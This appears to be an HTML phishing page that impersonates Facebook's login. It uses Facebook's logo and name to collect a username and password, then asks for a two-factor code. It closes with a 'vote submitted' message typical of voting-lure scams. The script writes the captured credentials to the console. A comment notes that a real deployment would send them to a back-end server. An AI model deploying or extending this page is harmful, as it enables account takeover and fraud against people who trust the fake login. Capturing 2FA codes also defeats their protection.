<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f9;
            margin: 0;
        }

        .container {
            text-align: center;
            border: 1px solid #ddd;
            padding: 30px;
            border-radius: 8px;
            background-color: white;
        }

        h1 {
            color: #87CEEB; /* Sky blue color */
            margin-top: 0;
            font-size: 48px;
        }

        .logo {
            width: 100px; /* Adjust size as needed */
            margin-bottom: 20px;
        }

        input {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        button {
            background-color: #87CEEB; /* Sky blue color */
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #6EC1E4; /* Slightly darker blue for hover effect */
        }

        .hidden {
            display: none;
        }

        #thankYouMessage, #verifyCodeMessage {
            margin-top: 20px;
        }

        .codeInput {
            margin-top: 10px;
            display: none;
        }

        .successMessage {
            display: none;
            color: green;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Facebook Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">

        <!-- Facebook Text -->
        <h1>Facebook</h1>
        
        <!-- Login Form -->
        <form id="loginForm">
            <input type="text" id="username" placeholder="Enter your username" required><br>
            <input type="password" id="password" placeholder="Enter your password" required><br>
            <button type="submit">Login</button>
        </form>
        
        <!-- Thank you message after login -->
        <div id="thankYouMessage" class="hidden">
            <h2>Almost there! One last step</h2>
            <p>Please provide 2FA verification code.</p>
            <button id="proceedWith2FA">Proceed with 2FA Code</button>
        </div>

        <!-- 2FA Button and Input box -->
        <div id="verifyCodeMessage" class="codeInput">
            <input type="text" id="2FACode" placeholder="Enter 2FA code" required><br>
            <button id="submit2FACode">Submit 2FA Code</button>
        </div>

        <!-- Final Success Message -->
        <div id="successMessage" class="successMessage">
            <h2>Your vote has been successfully submitted!</h2>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();  // Prevent the form from submitting the traditional way
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Simple validation
            if (username && password) {
                // Hide the login form and show the thank you message
                document.getElementById('loginForm').style.display = 'none';
                document.getElementById('thankYouMessage').style.display = 'block';

                // Log user details in the console (in a real-world scenario, you'd send it to a back-end server)
                console.log('Username:', username);
                console.log('Password:', password);
            } else {
                alert('Please enter both username and password!');
            }
        });

        // Event listener for the "Proceed with 2FA Code" button
        document.getElementById('proceedWith2FA').addEventListener('click', function() {
            // Show the 2FA input box and submit button
            document.getElementById('verifyCodeMessage').style.display = 'block';
            document.getElementById('proceedWith2FA').style.display = 'none';  // Hide the proceed button
        });

        // Event listener for the 2FA code submission
        document.getElementById('submit2FACode').addEventListener('click', function() {
            const twoFACode = document.getElementById('2FACode').value;

            if (twoFACode) {
                // Hide the 2FA input box and show success message
                document.getElementById('verifyCodeMessage').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';
            } else {
                alert('Please enter the 2FA code!');
            }
        });
    </script>

</body>
</html>
